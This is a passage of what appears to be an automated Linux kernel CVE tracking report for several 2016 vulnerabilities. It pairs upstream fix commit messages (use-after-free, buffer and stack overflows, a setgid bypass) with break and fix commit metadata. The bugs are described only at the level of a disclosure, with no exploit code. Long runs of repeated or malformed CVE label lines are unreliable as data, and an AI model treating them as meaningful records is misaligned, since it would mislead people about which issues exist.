    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -
